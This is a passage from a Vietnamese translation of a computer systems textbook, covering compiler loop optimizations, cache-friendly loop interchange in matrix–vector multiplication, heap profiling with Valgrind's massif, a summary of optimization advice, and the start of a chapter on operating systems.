<a href="C12-CodeOpt/loops_functions.html#NextTimes">Bảng 2</a> cho thấy thời gian chạy của kỹ thuật loop unrolling thủ công hệ số 2 (trong <code>optExample3.c</code>) so với việc thêm các optimization flag <code>-funroll-loops</code> và <code>-funroll-all-loops</code> vào chương trình trước đó (<a href="C12-CodeOpt/_attachments/optExample2.c">optExample2.c</a>).</p>
<div class="table-wrapper"><table><thead><tr><th>Phiên bản</th><th>Unoptimized</th><th><code>-O1</code></th><th><code>-O2</code></th><th><code>-O3</code></th></tr></thead><tbody>
<tr><td>Original (<a href="C12-CodeOpt/_attachments/optExample.c">optExample.c</a>)</td><td>3.86</td><td>2.32</td><td>2.14</td><td>2.15</td></tr>
<tr><td>With loop-invariant code motion (<a href="C12-CodeOpt/_attachments/optExample2.c">optExample2.c</a>)</td><td>1.83</td><td>1.63</td><td>1.71</td><td>1.63</td></tr>
<tr><td>With manual 2-factor loop unrolling (<a href="C12-CodeOpt/_attachments/optExample3.c">optExample3.c</a>)</td><td>1.65</td><td>1.53</td><td>1.45</td><td>1.45</td></tr>
<tr><td>With <code>-funroll-loops</code> (<a href="C12-CodeOpt/_attachments/optExample2.c">optExample2.c</a>)</td><td>1.82</td><td>1.48</td><td>1.46</td><td>1.46</td></tr>
<tr><td>With <code>-funroll-all-loops</code> (<a href="C12-CodeOpt/_attachments/optExample2.c">optExample2.c</a>)</td><td>1.81</td><td>1.47</td><td>1.47</td><td>1.46</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Thời gian (giây) để tạo 5.000.000 số nguyên tố</p>
<p>Mặc dù loop unrolling thủ công mang lại một chút cải thiện hiệu năng, nhưng các cờ loop unrolling tích hợp sẵn của trình biên dịch, khi kết hợp với các optimization flag hóa khác, cho hiệu năng tương đương.<br />
Nếu lập trình viên muốn áp dụng tối ưu hóa loop unrolling vào code của mình, họ nên ưu tiên sử dụng các cờ của trình biên dịch, <em>không</em> nên tự unroll vòng lặp thủ công.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="123-các-yếu-tố-cần-lưu-ý-về-bộ-nhớ-memory-considerations"><a class="header" href="#123-các-yếu-tố-cần-lưu-ý-về-bộ-nhớ-memory-considerations">12.3. Các yếu tố cần lưu ý về bộ nhớ (Memory Considerations)</a></h2>
<p>Lập trình viên cần đặc biệt chú ý đến việc sử dụng bộ nhớ, nhất là khi dùng các <strong>data structure</strong> (cấu trúc dữ liệu) tiêu tốn nhiều bộ nhớ như <strong>matrix</strong> (ma trận) và <strong>array</strong> (mảng).<br />
Mặc dù trình biên dịch cung cấp nhiều tính năng tối ưu hóa mạnh mẽ, nhưng không phải lúc nào nó cũng có thể thực hiện các tối ưu hóa giúp cải thiện việc sử dụng bộ nhớ của chương trình.</p>
<p>Trong phần này, chúng ta sẽ sử dụng một chương trình cài đặt phép nhân ma trận–vector (<a href="C12-CodeOpt/_attachments/matrixVector.c">matrixVector.c</a>) để dẫn dắt thảo luận về các kỹ thuật và công cụ cải thiện việc sử dụng bộ nhớ.</p>
<p>Hàm <code>main</code> của chương trình thực hiện hai bước:</p>
<ol>
<li>Cấp phát và khởi tạo ma trận đầu vào, vector đầu vào và ma trận đầu ra.</li>
<li>Thực hiện phép nhân ma trận–vector.</li>
</ol>
<p>Khi chạy chương trình với kích thước ma trận–vector là 10.000 × 10.000, kết quả cho thấy hàm <code>matrixVectorMultiply</code> chiếm phần lớn thời gian thực thi:</p>
<pre><code class="language-bash">$ gcc -o matrixVector matrixVector.c
$ ./matrixVector 10000 10000
Time to allocate and fill matrices: 1.2827
Time to allocate vector: 9.6e-05
Time to matrix-vector multiply: 1.98402
</code></pre>
<p>Vì vậy, phần thảo luận sẽ tập trung vào hàm <code>matrixVectorMultiply</code>.</p>
<h3 id="1231-loop-interchange"><a class="header" href="#1231-loop-interchange">12.3.1. Loop Interchange</a></h3>
<p><strong>Loop interchange</strong> (hoán đổi vòng lặp) là kỹ thuật tối ưu hóa thay đổi thứ tự của vòng lặp ngoài và vòng lặp trong trong các vòng lặp lồng nhau để tối đa hóa <strong>cache locality</strong> (tính cục bộ của cache).<br />
Việc thực hiện tự động kỹ thuật này là khó đối với trình biên dịch. Trong GCC, có cờ <code>-floop-interchange</code> nhưng hiện tại không được bật mặc định.<br />
Do đó, lập trình viên nên chú ý đến cách code truy cập các cấu trúc dữ liệu phức hợp trong bộ nhớ như mảng và ma trận.</p>
<p>Ví dụ, hãy xem xét kỹ hơn hàm <code>matrixVectorMultiply</code> trong <a href="C12-CodeOpt/_attachments/matrixVector.c">matrixVector.c</a>:</p>
<h4 id="phiên-bản-gốc-matrixvectorc"><a class="header" href="#phiên-bản-gốc-matrixvectorc">Phiên bản gốc (<a href="C12-CodeOpt/_attachments/matrixVector.c">matrixVector.c</a>)</a></h4>
<pre><code class="language-c">void matrixVectorMultiply(int **m, int *v, int **res, int row, int col) {
    int i, j;
    // cycles through every matrix column in inner-most loop (inefficient)
    for (j = 0; j &lt; col; j++) {
        for (i = 0; i &lt; row; i++) {
            res[i][j] = m[i][j] * v[j];
        }
    }
}
</code></pre>
<h4 id="phiên-bản-hoán-đổi-vòng-lặp-matrixvector2c"><a class="header" href="#phiên-bản-hoán-đổi-vòng-lặp-matrixvector2c">Phiên bản hoán đổi vòng lặp (<a href="C12-CodeOpt/_attachments/matrixVector2.c">matrixVector2.c</a>)</a></h4>
<pre><code class="language-c">void matrixVectorMultiply(int **m, int *v, int **res, int row, int col) {
    int i, j;
    // cycles through every row of matrix in inner-most loop
    for (i = 0; i &lt; row; i++) {
        for (j = 0; j &lt; col; j++) {
            res[i][j] = m[i][j] * v[j];
        }
    }
}
</code></pre>
<p><strong>Bảng 1.</strong> Hoán đổi vòng lặp trong hàm <code>matrixVectorMultiply()</code>.</p>
<p>Các ma trận đầu vào và đầu ra được cấp phát động (theo phương pháp thứ hai đã thảo luận trong chương C).<br />
Kết quả là các hàng trong ma trận <strong>không nằm liên tiếp nhau</strong> trong bộ nhớ, trong khi các phần tử trong mỗi hàng thì <strong>liên tiếp</strong>.<br />
Thứ tự vòng lặp hiện tại khiến chương trình duyệt qua từng <strong>cột</strong> thay vì từng <strong>hàng</strong>.</p>
<p>Hãy nhớ rằng <a href="C12-CodeOpt/../C11-MemHierarchy/caching.html#_direct_mapped_caches">dữ liệu được nạp vào cache theo <em>block</em></a> chứ không phải từng phần tử riêng lẻ.<br />
Do đó, khi một phần tử <em>x</em> trong mảng <code>res</code> hoặc <code>m</code> được truy cập, <strong>các phần tử liền kề với x</strong> cũng được nạp vào cache.<br />
Việc duyệt qua từng “cột” của ma trận gây ra nhiều <strong>cache miss</strong> hơn, vì cache buộc phải nạp block mới ở mỗi lần truy cập.</p>
<p><strong>Bảng 2</strong> cho thấy việc thêm optimization flag hóa <strong>không</strong> làm giảm thời gian chạy của hàm.<br />
Tuy nhiên, chỉ cần đổi thứ tự vòng lặp (như trong ví dụ code ở trên và trong <a href="C12-CodeOpt/_attachments/matrixVector2.c">matrixVector2.c</a>) đã giúp hàm chạy nhanh hơn gần <strong>8 lần</strong> và cho phép trình biên dịch thực hiện thêm các tối ưu hóa khác.</p>
<h4 id="thời-gian-thực-thi-giây-cho-phép-nhân-ma-trận-10000--10000"><a class="header" href="#thời-gian-thực-thi-giây-cho-phép-nhân-ma-trận-10000--10000">Thời gian thực thi (giây) cho phép nhân ma trận 10.000 × 10.000</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Phiên bản</th><th>Chương trình</th><th>Unoptimized</th><th><code>-O1</code></th><th><code>-O2</code></th><th><code>-O3</code></th></tr></thead><tbody>
<tr><td>Original</td><td><code>matrixVector</code></td><td>2.01</td><td>2.05</td><td>2.07</td><td>2.08</td></tr>
<tr><td>With Loop Interchange</td><td><code>matrixVector2</code></td><td>0.27</td><td>0.08</td><td>0.06</td><td>0.06</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Thời gian (giây) thực hiện phép nhân ma trận 10.000 × 10.000 phần tử.</p>
<p>Công cụ <code>cachegrind</code> của Valgrind (được thảo luận trong <a href="C12-CodeOpt/../C11-MemHierarchy/cachegrind.html#_cache_analysis_and_valgrind">Chương 11</a>) là một cách tuyệt vời để xác định các vấn đề về <strong>data locality</strong> (tính cục bộ dữ liệu), và cho thấy sự khác biệt trong truy cập cache giữa hai phiên bản của hàm <code>matrixVectorMultiply</code> ở ví dụ trên.</p>
<h3 id="1232-một-số-tối-ưu-hóa-khác-của-trình-biên-dịch-để-cải-thiện-locality-fission-và-fusion"><a class="header" href="#1232-một-số-tối-ưu-hóa-khác-của-trình-biên-dịch-để-cải-thiện-locality-fission-và-fusion">12.3.2. Một số tối ưu hóa khác của trình biên dịch để cải thiện locality: Fission và Fusion</a></h3>
<p>Chạy lại chương trình đã cải tiến với dữ liệu 10.000 × 10.000 phần tử cho kết quả thời gian như sau:</p>
<pre><code class="language-bash">$ gcc -o matrixVector2 matrixVector2.c
$ ./matrixVector2 10000 10000
Time to allocate and fill matrices: 1.29203
Time to allocate vector: 0.000107
Time to matrix-vector multiply: 0.271369
</code></pre>
<p>Bây giờ, việc cấp phát và điền dữ liệu cho ma trận chiếm nhiều thời gian nhất.<br />
Đo đạc chi tiết hơn cho thấy phần <strong>điền dữ liệu</strong> cho ma trận mới là nguyên nhân chính.<br />
Hãy xem kỹ đoạn code này:</p>
<pre><code class="language-c">// fill matrices
for (i = 0; i &lt; rows; i++){
    fillArrayRandom(matrix[i], cols);
    fillArrayZeros(result[i], cols);
}
</code></pre>
<p>Để điền dữ liệu cho ma trận đầu vào và đầu ra, vòng lặp <code>for</code> duyệt qua tất cả các hàng và gọi hàm <code>fillArrayRandom</code> và <code>fillArrayZeros</code> cho từng hàng.<br />
Trong một số trường hợp, sẽ có lợi nếu trình biên dịch tách vòng lặp này thành hai vòng lặp riêng biệt — kỹ thuật này gọi là <strong>loop fission</strong>.</p>
<h4 id="phiên-bản-gốc"><a class="header" href="#phiên-bản-gốc">Phiên bản gốc</a></h4>
<pre><code class="language-c">for (i = 0; i &lt; rows; i++) {
    fillArrayRandom(matrix[i], cols);
    fillArrayZeros(result[i], cols);
}
</code></pre>
<h4 id="phiên-bản-với-loop-fission"><a class="header" href="#phiên-bản-với-loop-fission">Phiên bản với loop fission</a></h4>
<pre><code class="language-c">for (i = 0; i &lt; rows; i++) {
    fillArrayRandom(matrix[i], cols);
}

for (i = 0; i &lt; rows; i++) {
    fillArrayZeros(result[i], cols);
}
</code></pre>
<p><strong>Bảng 3.</strong> Ví dụ loop fission trên vòng lặp điền dữ liệu ma trận trong <code>main</code>.</p>
<p>Quá trình kết hợp hai vòng lặp chạy trên cùng một phạm vi thành một vòng lặp duy nhất (ngược lại với loop fission) được gọi là <strong>loop fusion</strong>.<br />
Loop fission và loop fusion là những ví dụ tối ưu hóa mà trình biên dịch có thể thực hiện để cải thiện <strong>data locality</strong>.</p>
<p>Các trình biên dịch cho bộ xử lý đa nhân cũng có thể dùng loop fission hoặc fusion để cho phép vòng lặp chạy hiệu quả hơn trên nhiều nhân.<br />
Ví dụ: trình biên dịch có thể dùng loop fission để gán hai vòng lặp cho hai nhân khác nhau.<br />
Ngược lại, nó có thể dùng loop fusion để gộp các thao tác phụ thuộc vào nhau vào cùng một vòng lặp, rồi phân phối cho mỗi nhân một tập con các lần lặp (giả sử dữ liệu giữa các lần lặp là độc lập).</p>
<p>Trong trường hợp của chúng ta, áp dụng loop fission thủ công <strong>không</strong> cải thiện trực tiếp hiệu năng; thời gian điền dữ liệu mảng hầu như không thay đổi.<br />
Tuy nhiên, nó giúp lộ ra một tối ưu hóa tinh tế hơn: vòng lặp chứa <code>fillArrayZeros</code> là <strong>không cần thiết</strong>.<br />
Hàm <code>matrixVectorMultiply</code> sẽ gán giá trị cho từng phần tử trong mảng <code>result</code>, nên việc khởi tạo trước tất cả bằng 0 là dư thừa.</p>
<h4 id="phiên-bản-trước-matrixvector2c"><a class="header" href="#phiên-bản-trước-matrixvector2c">Phiên bản trước (<a href="C12-CodeOpt/_attachments/matrixVector2.c">matrixVector2.c</a>)</a></h4>
<pre><code class="language-c">for (i = 0; i &lt; rows; i++) {
    matrix[i] = allocateArray(cols);
    result[i] = allocateArray(cols);
}

for (i = 0; i &lt; rows; i++) {
    fillArrayRandom(matrix[i], cols);
    fillArrayZeros(result[i], cols);
}
</code></pre>
<h4 id="phiên-bản-cập-nhật-với-calloc-matrixvector3c"><a class="header" href="#phiên-bản-cập-nhật-với-calloc-matrixvector3c">Phiên bản cập nhật với <code>calloc()</code> (<a href="C12-CodeOpt/_attachments/matrixVector3.c">matrixVector3.c</a>)</a></h4>
<pre><code class="language-c">for (i = 0; i &lt; rows; i++) {
    matrix[i] = allocateArray(cols);
    result[i] = allocateArray(cols);
}

for (i = 0; i &lt; rows; i++) {
    fillArrayRandom(matrix[i], cols);
    // fillArrayZeros(result[i], cols); // no longer needed
}
</code></pre>
<p><strong>Bảng 4.</strong> Loại bỏ lời gọi <code>fillArrayZeros</code> không cần thiết.</p>
<h3 id="1233-phân-tích-bộ-nhớ-với-massif"><a class="header" href="#1233-phân-tích-bộ-nhớ-với-massif">12.3.3. Phân tích bộ nhớ với Massif</a></h3>
<p>Việc thay đổi ở bước trước chỉ giúp giảm nhẹ thời gian chạy.<br />
Mặc dù đã loại bỏ bước điền toàn bộ phần tử trong ma trận kết quả bằng số 0, nhưng vẫn cần một lượng thời gian đáng kể để điền ma trận đầu vào bằng các số ngẫu nhiên:</p>
<pre><code class="language-bash">$ gcc -o matrixVector3 matrixVector3.c
$ ./matrixVector3 10000 10000
Time to allocate matrices: 0.049073
Time to fill matrices: 0.946801
Time to allocate vector: 9.3e-05
Time to matrix-vector multiply: 0.359525
</code></pre>
<p>Mặc dù mỗi mảng được lưu <strong>không liên tiếp</strong> trong bộ nhớ, nhưng mỗi mảng chiếm <code>10,000 × sizeof(int)</code> byte, tức 40.000 byte.<br />
Vì có tổng cộng 20.000 mảng (10.000 cho ma trận đầu vào và 10.000 cho ma trận kết quả) được cấp phát, điều này tương ứng với <strong>800 triệu byte</strong>, hay khoảng <strong>762 MB</strong> dung lượng.<br />
Việc điền 762 MB dữ liệu bằng số ngẫu nhiên rõ ràng sẽ tốn nhiều thời gian.<br />
Với ma trận, mức sử dụng bộ nhớ tăng <strong>theo hàm bậc hai</strong> với kích thước đầu vào, và có thể ảnh hưởng lớn đến hiệu năng.</p>
<p>Công cụ <code>massif</code> của Valgrind có thể giúp bạn <strong>profile</strong> (phân tích) việc sử dụng bộ nhớ.<br />
Giống như các công cụ Valgrind khác đã đề cập trong sách này (<a href="C12-CodeOpt/../C3-C_debug/valgrind.html#_debugging_memory_with_valgrind">memcheck</a>, <a href="C12-CodeOpt/../C11-MemHierarchy/cachegrind.html#_cache_analysis_and_valgrind">cachegrind</a>, và callgrind), <code>massif</code> chạy như một lớp bao quanh file thực thi của chương trình.<br />
Cụ thể, <code>massif</code> sẽ chụp lại các <strong>snapshot</strong> (ảnh chụp) về việc sử dụng bộ nhớ của chương trình trong suốt quá trình chạy, và phân tích cách mức sử dụng bộ nhớ thay đổi.<br />
Lập trình viên có thể thấy <code>massif</code> hữu ích để theo dõi cách chương trình sử dụng <strong>heap memory</strong> (bộ nhớ heap), và xác định cơ hội cải thiện việc sử dụng bộ nhớ.</p>
<p>Hãy chạy <code>massif</code> trên file thực thi <code>matrixVector3</code>:</p>
<pre><code class="language-bash">$ valgrind --tool=massif ./matrixVector3 10000 10000
==7030== Massif, a heap profiler
==7030== Copyright (C) 2003-2015, and GNU GPL'd, by Nicholas Nethercote
==7030== Using Valgrind-3.11.0 and LibVEX; rerun with -h for copyright info
==7030== Command: ./matrixVector3 10000 10000
==7030==
Time to allocate matrices: 0.049511
Time to fill matrices: 4.31627
Time to allocate vector: 0.001015
Time to matrix-vector multiply: 0.62672
==7030==
</code></pre>
<p>Khi chạy <code>massif</code>, nó sẽ tạo ra một file <code>massif.out.xxxx</code>, trong đó <code>xxxx</code> là một ID duy nhất.<br />
Nếu bạn đang thực hành theo, hãy gõ <code>ls</code> để xem file massif tương ứng.<br />
Trong ví dụ này, file tương ứng là <code>massif.out.7030</code>.<br />
Dùng lệnh <code>ms_print</code> để xem kết quả của <code>massif</code>:</p>
<pre><code class="language-bash">$ ms_print massif.out.7030
-----------------------------------------------------------------------------
Command:            ./matrixVector3 10000 10000
Massif arguments:   (none)
ms_print arguments: massif.out.7030
-----------------------------------------------------------------------------

    MB
763.3^                                                ::::::::::::::::::::::#
     |:::::::::::::::::::::::::::::::::::::::::::::::::                     #
     |:                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
     |@                                               :                     #
   0 +--------------------------------------------------------------------&gt;Gi
     0                                                                  9.778

Number of snapshots: 80
Detailed snapshots: [3, 12, 17, 22, 49, 59, 69, 79 (peak)]
</code></pre>
<p>Ở đầu phần kết quả là <strong>biểu đồ sử dụng bộ nhớ</strong>.<br />
Trục <em>x</em> biểu diễn số lượng lệnh (<strong>instructions</strong>) đã thực thi.<br />
Trục <em>y</em> biểu diễn mức sử dụng bộ nhớ.</p>
<p>Biểu đồ trên cho thấy tổng cộng <strong>9,778 tỷ</strong> (Gi) lệnh đã được thực thi trong lần chạy <code>matrixVector3</code>.<br />
Trong quá trình thực thi, <code>massif</code> đã chụp tổng cộng <strong>80 snapshot</strong> để đo mức sử dụng <strong>heap</strong>.<br />
Mức sử dụng bộ nhớ đạt đỉnh ở snapshot cuối cùng (79).<br />
Mức sử dụng bộ nhớ cực đại của chương trình là <strong>763,3 MB</strong>, và duy trì tương đối ổn định trong suốt quá trình chạy.</p>
<p>Phần tóm tắt của tất cả các snapshot xuất hiện ngay sau biểu đồ.<br />
Ví dụ, bảng dưới đây tương ứng với các snapshot xung quanh snapshot 79:</p>
<pre><code>....
------------------------------------------------------------------------------
  n        time(i)         total(B)   useful-heap(B) extra-heap(B)   stacks(B)
------------------------------------------------------------------------------
 70      1,081,926      727,225,400      727,080,000       145,400          0
 71      1,095,494      737,467,448      737,320,000       147,448          0
 72      1,109,062      747,709,496      747,560,000       149,496          0
 73      1,122,630      757,951,544      757,800,000       151,544          0
 74      1,136,198      768,193,592      768,040,000       153,592          0
 75      1,149,766      778,435,640      778,280,000       155,640          0
 76      1,163,334      788,677,688      788,520,000       157,688          0
 77      1,176,902      798,919,736      798,760,000       159,736          0
 78  7,198,260,935      800,361,056      800,201,024       160,032          0
 79 10,499,078,349      800,361,056      800,201,024       160,032          0
99.98% (800,201,024B) (heap allocations) malloc/new/new[], --alloc-fns, etc.
-&gt;99.96% (800,040,000B) 0x40089D: allocateArray (in matrixVector3)
</code></pre>
<p>Mỗi hàng trong bảng tương ứng với một snapshot cụ thể, bao gồm:</p>
<ul>
<li><strong>Thời điểm</strong> snapshot được chụp (<code>time(i)</code>).</li>
<li><strong>Tổng mức tiêu thụ bộ nhớ heap</strong> tại thời điểm đó (<code>total(B)</code>).</li>
<li><strong>Số byte chương trình yêu cầu</strong> tại thời điểm đó (<code>useful-heap</code>).</li>
<li><strong>Số byte được cấp phát vượt quá</strong> so với yêu cầu của chương trình (<code>extra-heap</code>).</li>
<li><strong>Kích thước stack</strong> (<code>stacks(B)</code>).</li>
</ul>
<p>Theo mặc định, việc <strong>profiling stack</strong> bị tắt (vì nó làm <code>massif</code> chạy chậm đáng kể).<br />
Để bật profiling stack, hãy dùng tùy chọn <code>--stacks=yes</code> khi chạy <code>massif</code>.</p>
<p>Công cụ <code>massif</code> cho thấy <strong>99,96%</strong> mức sử dụng bộ nhớ heap của chương trình xảy ra trong hàm <code>allocateArray</code>, và tổng cộng <strong>800 triệu byte</strong> đã được cấp phát — phù hợp với phép tính ước lượng nhanh mà chúng ta đã thực hiện trước đó.</p>
<p>Người đọc có thể thấy <code>massif</code> là một công cụ hữu ích để xác định các khu vực sử dụng nhiều bộ nhớ heap trong chương trình — điều thường làm chậm chương trình.<br />
Ví dụ, <strong>memory leak</strong> (rò rỉ bộ nhớ) có thể xảy ra khi lập trình viên thường xuyên gọi <code>malloc</code> nhưng không gọi <code>free</code> tại thời điểm thích hợp đầu tiên.<br />
Công cụ <code>massif</code> đặc biệt hữu ích để phát hiện các rò rỉ như vậy.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="124-những-điểm-chính-và-tóm-tắt"><a class="header" href="#124-những-điểm-chính-và-tóm-tắt">12.4. Những điểm chính và Tóm tắt</a></h2>
<p>Hành trình ngắn (và có lẽ hơi gây nản) của chúng ta vào thế giới <strong>code optimization</strong> (tối ưu hóa code) nên truyền tải một thông điệp rất quan trọng tới người đọc: nếu bạn đang nghĩ đến việc tối ưu code thủ công, hãy cân nhắc kỹ xem điều gì đáng để bạn bỏ thời gian và điều gì nên để cho trình biên dịch xử lý.<br />
Dưới đây là một số lời khuyên quan trọng khi bạn muốn cải thiện hiệu năng code.</p>
<p><strong>Chọn cấu trúc dữ liệu và thuật toán tốt</strong></p>
<p>Không có gì có thể thay thế việc sử dụng đúng <strong>algorithm</strong> (thuật toán) và <strong>data structure</strong> (cấu trúc dữ liệu); việc không làm như vậy thường là nguyên nhân hàng đầu dẫn đến hiệu năng kém.<br />
Ví dụ, thuật toán nổi tiếng <strong>Sieve of Eratosthenes</strong> là một cách hiệu quả hơn nhiều để tạo ra các số nguyên tố so với thuật toán tùy chỉnh của chúng ta trong <code>optExample</code>, và mang lại cải thiện hiệu năng đáng kể.<br />
Đoạn dưới đây cho thấy thời gian cần để tạo tất cả các số nguyên tố từ 2 đến 5 triệu bằng một cài đặt của thuật toán sieve:</p>
<pre><code class="language-bash">$ gcc -o genPrimes genPrimes.c
$ ./genPrimes 5000000
Found 348513 primes (0.122245 s)
</code></pre>
<p>Thuật toán sieve chỉ mất 0,12 giây để tìm tất cả các số nguyên tố từ 2 đến 5 triệu, so với 1,46 giây mà <code>optExample2</code> cần để tạo cùng tập số nguyên tố với optimization flag <code>-O3</code> được bật (nhanh hơn 12×).<br />
Việc cài đặt thuật toán sieve được để lại như một bài tập cho bạn đọc; tuy nhiên, rõ ràng là việc chọn một thuật toán tốt hơn ngay từ đầu sẽ tiết kiệm hàng giờ tối ưu hóa thủ công. Ví dụ này cho thấy tại sao kiến thức về cấu trúc dữ liệu và thuật toán là nền tảng đối với các nhà khoa học máy tính.</p>
<p><strong>Sử dụng hàm thư viện chuẩn bất cứ khi nào có thể</strong></p>
<p>Đừng “phát minh lại bánh xe”. Nếu trong quá trình lập trình bạn cần một hàm thực hiện một tác vụ rất phổ biến (ví dụ: tìm giá trị tuyệt đối, hoặc tìm giá trị lớn nhất/nhỏ nhất trong một danh sách số), hãy dừng lại và kiểm tra xem hàm đó đã tồn tại trong <strong>standard library</strong> (thư viện chuẩn) của ngôn ngữ hay chưa.<br />
Các hàm trong thư viện chuẩn thường được kiểm thử kỹ và tối ưu hóa cho hiệu năng.<br />
Ví dụ, nếu bạn tự viết một phiên bản <code>sqrt</code> của riêng mình, trình biên dịch có thể sẽ không biết để tự động thay thế lời gọi hàm đó bằng lệnh <code>fsqrt</code>.</p>
<p><strong>Tối ưu dựa trên dữ liệu, không dựa trên cảm giác</strong></p>
<p>Nếu sau khi đã chọn cấu trúc dữ liệu và thuật toán tốt <em>và</em> sử dụng các hàm thư viện chuẩn mà vẫn cần cải thiện hiệu năng, hãy dùng một công cụ <strong>code profiler</strong> (phân tích hiệu năng code) tốt như Valgrind.<br />
Tối ưu hóa <em>không bao giờ</em> nên dựa trên cảm giác. Tập trung quá nhiều vào những gì bạn <em>nghĩ</em> là nên tối ưu (mà không có dữ liệu chứng minh) thường dẫn đến lãng phí thời gian.</p>
<p><strong>Tách code phức tạp thành nhiều hàm</strong></p>
<p>Việc nội tuyến code thủ công thường không mang lại cải thiện hiệu năng đáng kể so với những gì trình biên dịch hiện đại có thể làm. Thay vào đó, hãy giúp trình biên dịch dễ dàng tối ưu hơn cho bạn.<br />
Trình biên dịch dễ tối ưu hơn với các đoạn code ngắn. Việc tách các thao tác phức tạp thành nhiều hàm vừa tăng khả năng đọc code, vừa giúp trình biên dịch tối ưu dễ hơn.<br />
Hãy kiểm tra xem trình biên dịch của bạn có tự động thử nội tuyến hay có cờ riêng để thử nội tuyến code hay không. Tốt hơn hết là để trình biên dịch thực hiện nội tuyến thay vì tự làm thủ công.</p>
<p><strong>Ưu tiên khả năng đọc code</strong></p>
<p>Trong nhiều ứng dụng ngày nay, khả năng đọc code là ưu tiên hàng đầu. Thực tế là code được đọc nhiều hơn là được viết.<br />
Nhiều công ty dành nhiều thời gian đào tạo kỹ sư phần mềm viết code theo một phong cách nhất định để tối đa hóa khả năng đọc.<br />
Nếu việc tối ưu code làm giảm đáng kể khả năng đọc, bạn cần cân nhắc xem cải thiện hiệu năng có xứng đáng với sự đánh đổi đó hay không.<br />
Ví dụ, nhiều trình biên dịch hiện nay có optimization flag cho phép <strong>loop unrolling</strong> (trải vòng lặp). Lập trình viên nên luôn sử dụng các optimization flag này thay vì tự unroll vòng lặp, vì điều đó có thể làm giảm mạnh khả năng đọc code.<br />
Giảm khả năng đọc code thường làm tăng khả năng xuất hiện lỗi không mong muốn, từ đó có thể dẫn đến lỗ hổng bảo mật.</p>
<p><strong>Chú ý đến việc sử dụng bộ nhớ</strong></p>
<p>Việc sử dụng bộ nhớ của chương trình thường ảnh hưởng lớn hơn đến thời gian thực thi so với số lượng lệnh mà nó chạy.<br />
<a href="C12-CodeOpt/memory_considerations.html#_loop_interchange">Ví dụ về loop interchange</a> minh họa rõ điều này. Trong cả hai trường hợp, vòng lặp thực thi cùng số lượng lệnh, nhưng thứ tự vòng lặp lại ảnh hưởng đáng kể đến truy cập bộ nhớ và <strong>locality</strong> (tính cục bộ).<br />
Hãy nhớ sử dụng các công cụ phân tích bộ nhớ như <code>massif</code> và <code>cachegrind</code> khi tối ưu chương trình.</p>
<p><strong>Trình biên dịch luôn được cải tiến</strong></p>
<p>Các lập trình viên trình biên dịch liên tục cập nhật để thực hiện các tối ưu hóa phức tạp hơn một cách an toàn.<br />
Ví dụ, GCC đã chuyển sang dạng <a href="https://gcc.gnu.org/onlinedocs/gccint/SSA.html">static single assignment (SSA)</a> từ phiên bản 4.0, giúp cải thiện đáng kể hiệu quả của một số tối ưu hóa.<br />
Nhánh <code>GRAPHITE</code> của mã nguồn GCC triển khai <a href="https://polyhedral.info/">polyhedral model</a>, cho phép trình biên dịch thực hiện các loại biến đổi vòng lặp phức tạp hơn.<br />
Khi trình biên dịch ngày càng tinh vi, lợi ích của tối ưu hóa thủ công giảm đi đáng kể.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="13-hệ-điều-hành-the-operating-system"><a class="header" href="#13-hệ-điều-hành-the-operating-system">13. Hệ điều hành (The Operating System)</a></h2>
<p><strong>Operating system</strong> (OS – hệ điều hành) là một lớp <strong>system software</strong> (phần mềm hệ thống) đặc biệt, nằm giữa <strong>computer hardware</strong> (phần cứng máy tính) và <strong>application programs</strong> (chương trình ứng dụng) đang chạy trên máy tính (xem <strong>Hình 1</strong>).<br />
Phần mềm OS tồn tại liên tục trên máy tính, từ khi bật nguồn cho đến khi tắt máy.<br />
Mục đích chính của nó là <strong>quản lý</strong> các thành phần phần cứng bên dưới để chạy hiệu quả các <strong>program workload</strong> (khối lượng công việc của chương trình) và làm cho máy tính <strong>dễ sử dụng</strong>.</p>
<p><img src="C13-OS/_images/os.png" alt="The OS sits between the user and the HW" /></p>
<p><strong>Hình 1.</strong> OS là phần mềm hệ thống đặc biệt nằm giữa người dùng và phần cứng. Nó quản lý phần cứng máy tính và triển khai các <strong>abstraction</strong> (trừu tượng hóa) để giúp phần cứng dễ sử dụng hơn.</p>
<p>Một trong những cách OS giúp phần cứng máy tính dễ sử dụng là hỗ trợ khởi chạy các chương trình trên máy tính.<br />
Hãy xem điều gì xảy ra khi người dùng nhấp đúp vào một biểu tượng hoặc gõ tên tệp thực thi của chương trình tại <strong>shell prompt</strong> (ví dụ: <code>./a.out</code>) để khởi chạy chương trình trên hệ thống.<br />
OS sẽ xử lý toàn bộ chi tiết của thao tác này, chẳng hạn như nạp chương trình từ đĩa vào RAM và khởi tạo CPU để bắt đầu chạy các lệnh của chương trình; OS ẩn khỏi người dùng những hành động mức thấp này, vốn là cần thiết để chạy chương trình trên máy tính.</p>
<p>Một ví dụ về cách OS sử dụng hiệu quả tài nguyên hệ thống là triển khai <strong>multiprogramming</strong> (đa chương trình), nghĩa là cho phép nhiều hơn một chương trình chạy trên máy tính tại cùng một thời điểm.<br />
Multiprogramming không nhất thiết có nghĩa là tất cả các chương trình đều chạy đồng thời trên phần cứng.<br />
Trên thực tế, tập hợp các chương trình đang chạy trong hệ thống thường lớn hơn nhiều so với số lõi CPU.<br />
Thay vào đó, nó có nghĩa là OS chia sẻ tài nguyên phần cứng, bao gồm CPU, giữa nhiều chương trình đang chạy.<br />
Ví dụ: khi một chương trình cần dữ liệu đang nằm trên đĩa, OS có thể đưa một chương trình khác lên CPU trong khi chương trình đầu tiên chờ dữ liệu.<br />
Nếu không có multiprogramming, CPU sẽ rảnh rỗi bất cứ khi nào chương trình đang chạy truy cập các thiết bị phần cứng chậm hơn.</p>
<p>Để hỗ trợ multiprogramming, OS cần triển khai một abstraction của chương trình đang chạy, gọi là <strong>process</strong> (tiến trình).<br />
Abstraction process cho phép OS quản lý tập hợp nhiều chương trình đang chạy trong hệ thống tại bất kỳ thời điểm nào.</p>
